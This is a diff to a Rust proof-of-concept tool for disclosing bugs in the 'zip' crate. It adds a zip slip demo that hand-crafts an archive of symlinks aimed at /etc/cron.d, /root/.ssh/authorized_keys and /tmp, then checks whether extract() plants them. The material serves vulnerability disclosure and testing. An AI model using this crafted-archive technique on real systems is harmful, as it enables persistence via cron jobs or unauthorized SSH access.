@@ -30,6 +30,8 @@
 //!     cargo run                      # full self-contained demo in a temp dir
 //!     cargo run -- craft out.zip     # just write the crafted archive
 //!     cargo run -- extract a.zip d/  # extract + inspect any archive
+//!     cargo run -- slip              # bug 2: symlink zip slip
+//!     cargo run -- cloak             # bug 3: zip cloaking
 
 use std::fs;
 use std::io::{self, Read, Write};
@@ -51,6 +53,16 @@ const CLOAK_LOCAL_NAME: &str = "config/app.conf"; // what a streaming extractor 
 const CLOAK_BODY: &[u8] =
     b"inert marker: this file would silently overwrite config/app.conf\n";
 
+/// Bug 2 (zip slip) fixtures: symlink entries aimed at known paths outside the
+/// extraction folder. zip 8.6.0 refuses `../` names, but on a Unix target its
+/// extract() creates links without checking where they point. Bodies are the
+/// link targets; nothing is ever written through them.
+const SLIP_LINKS: [(&str, &str); 3] = [
+    ("cron.d", "/etc/cron.d"),
+    ("authorized_keys", "/root/.ssh/authorized_keys"),
+    ("tmp", "/tmp"),
+];
+
 fn main() {
     let args: Vec<String> = std::env::args().skip(1).collect();
     let result = match args.first().map(String::as_str) {
@@ -64,6 +76,7 @@ fn main() {
             let dir = args.get(2).map(PathBuf::from).expect("usage: extract <zip> <dir>");
             extract_and_report(&zip, &dir).map(|_| ())
         }
+        Some("slip") => run_slip_demo(),
         Some("cloak") => run_cloak_demo(),
         Some(other) => {
             eprintln!("unknown command: {other}");
@@ -98,12 +111,111 @@ fn run_demo() -> io::Result<()> {
 
     verdict(&findings);
 
+    // ---- Bug 2: zip slip via symlinks ----
+    let slip_zip = root.join("slip.zip");
+    craft_slip_archive(&slip_zip)?;
+    demo_slip(&slip_zip, &root.join("slip-extracted"))?;
+
     // ---- Bug 3: zip cloaking (CVE-2026-115905) ----
     let cloak_zip = root.join("cloaked.zip");
     craft_cloaked_archive(&cloak_zip)?;
     demo_cloak(&cloak_zip, &root.join("cloak-extracted"))?;
 
     println!("\nartifacts left in {} for inspection", root.display());
+    Ok(())
+}
+
+/// Stand-alone Bug 2 runner for `cargo run -- slip`.
+fn run_slip_demo() -> io::Result<()> {
+    let root = std::env::temp_dir().join(format!("zip-slip-demo-{}", std::process::id()));
+    let _ = fs::remove_dir_all(&root);
+    fs::create_dir_all(&root)?;
+    banner("Zip slip — symlink entries that point out of the extraction folder");
+    println!("crate under test : zip {}", zip_crate_version());
+    let slip_zip = root.join("slip.zip");
+    craft_slip_archive(&slip_zip)?;
+    demo_slip(&slip_zip, &root.join("slip-extracted"))?;
+    println!("\nartifacts left in {} for inspection", root.display());
+    Ok(())
+}
+
+/// Build a stored archive of `SLIP_LINKS`: each entry's mode is `S_IFLNK | 0o777`
+/// and its body is the link target.
+fn craft_slip_archive(out: &Path) -> io::Result<()> {
+    let mut buf: Vec<u8> = Vec::new();
+    let mut directory: Vec<u8> = Vec::new();
+    for (name, target) in SLIP_LINKS {
+        let (name, data) = (name.as_bytes(), target.as_bytes());
+        let (crc, size, offset) = (crc32(data), data.len() as u32, buf.len() as u32);
+        // ---- Local file header ----
+        buf.extend_from_slice(&0x0403_4b50u32.to_le_bytes());
+        buf.extend_from_slice(&20u16.to_le_bytes());
+        buf.extend_from_slice(&[0; 8]); // flags, method (stored), mod time, mod date
+        buf.extend_from_slice(&crc.to_le_bytes());
+        buf.extend_from_slice(&size.to_le_bytes());
+        buf.extend_from_slice(&size.to_le_bytes());
+        buf.extend_from_slice(&(name.len() as u16).to_le_bytes());
+        buf.extend_from_slice(&0u16.to_le_bytes());
+        buf.extend_from_slice(name);
+        buf.extend_from_slice(data);
+        // ---- Central directory header (Unix host, symlink mode) ----
+        directory.extend_from_slice(&0x0201_4b50u32.to_le_bytes());
+        directory.extend_from_slice(&0x031eu16.to_le_bytes());
+        directory.extend_from_slice(&20u16.to_le_bytes());
+        directory.extend_from_slice(&[0; 8]);
+        directory.extend_from_slice(&crc.to_le_bytes());
+        directory.extend_from_slice(&size.to_le_bytes());
+        directory.extend_from_slice(&size.to_le_bytes());
+        directory.extend_from_slice(&(name.len() as u16).to_le_bytes());
+        directory.extend_from_slice(&[0; 8]); // extra, comment, disk start, internal attrs
+        directory.extend_from_slice(&((0o120777u32) << 16).to_le_bytes());
+        directory.extend_from_slice(&offset.to_le_bytes());
+        directory.extend_from_slice(name);
+    }
+    let (cd_offset, cd_size) = (buf.len() as u32, directory.len() as u32);
+    buf.extend_from_slice(&directory);
+    // ---- End of central directory ----
+    let count = SLIP_LINKS.len() as u16;
+    buf.extend_from_slice(&0x0605_4b50u32.to_le_bytes());
+    buf.extend_from_slice(&[0; 4]);
+    buf.extend_from_slice(&count.to_le_bytes());
+    buf.extend_from_slice(&count.to_le_bytes());
+    buf.extend_from_slice(&cd_size.to_le_bytes());
+    buf.extend_from_slice(&cd_offset.to_le_bytes());
+    buf.extend_from_slice(&0u16.to_le_bytes());
+    fs::write(out, &buf)
+}
+
+/// Extract the slip archive with `ZipArchive::extract` and show where each link
+/// points. Nothing is written through the links.
+fn demo_slip(zip_path: &Path, out_dir: &Path) -> io::Result<()> {
+    banner("Bug 2 — zip slip: symlinks planted by extract(), pointing out of the folder");
+    let _ = fs::remove_dir_all(out_dir);
+    fs::create_dir_all(out_dir)?;
+    let mut archive = zip::ZipArchive::new(fs::File::open(zip_path)?)
+        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e.to_string()))?;
+    archive
+        .extract(out_dir)
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e.to_string()))?;
+
+    let mut escaped = 0;
+    for (name, _) in SLIP_LINKS {
+        match fs::read_link(out_dir.join(name)) {
+            Ok(target) => {
+                escaped += 1;
+                println!("    {name:<16} -> {}   (outside {})", target.display(), out_dir.display());
+            }
+            Err(_) => println!("    {name:<16} not a link"),
+        }
+    }
+    println!();
+    if escaped > 0 {
+        println!("VULNERABLE: extract() planted {escaped} symlink(s) that leave the extraction folder.");
+        println!("Anything that later writes {}/cron.d/job writes /etc/cron.d/job.", out_dir.display());
+        println!("Fix: sandbox the extractor; in the Cosmonic demo these land as plain files.");
+    } else {
+        println!("No links were planted.");
+    }
     Ok(())
 }
 
